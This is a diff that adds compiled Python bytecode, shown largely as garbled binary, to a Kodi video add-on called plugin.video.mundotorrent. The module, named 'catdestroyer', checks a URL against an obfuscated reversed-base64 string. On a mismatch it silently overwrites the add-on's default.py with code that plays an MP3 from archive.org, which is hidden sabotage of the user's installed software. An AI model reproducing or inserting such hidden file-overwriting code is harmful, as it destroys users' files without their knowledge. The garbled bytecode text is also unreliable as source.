@@ -1,0 +1,8 @@
+ó
+ŸÔgZc           @   s%   d  d l  Z  d  d l Z d „  Z d S(   iÿÿÿÿNc         C   s‹   t  d k |  d k t  | k r- | j ƒ  nZ t j j t j d ƒ j d ƒ ƒ } t | d ƒ } | j	 d ƒ | j	 d ƒ | j	 d ƒ d  S(	   Nt,   L5kdGp2MIh3L3Fmcv02bj5ibpJWZ0NXYw9yL6MHc0RHas   plugin.video.mundotorrent7   special://home/addons/plugin.video.mundotorrent/default.pys   utf-8t   ws   
+ import xbmcsR   
+ toca = https://ia601500.us.archive.org/35/items/fabiolmglgeo_gmail_Open/open.mp3s   
+ xbmc.Player().play(toca)(
+   t   urlat   SKindext   ost   patht   joint   xbmct   translatePatht   decodet   opent   write(   t   addont   urlt   defaultt   f(    (    sL   C:\Kratos\Kratos\portable_data\addons\plugin.video.mundotorrent\catdestroyer.pyt   check_crifer   s    
+
+$(   R   R   R   (    (    (    sL   C:\Kratos\Kratos\portable_data\addons\plugin.video.mundotorrent\catdestroyer.pyt   <module>   s   
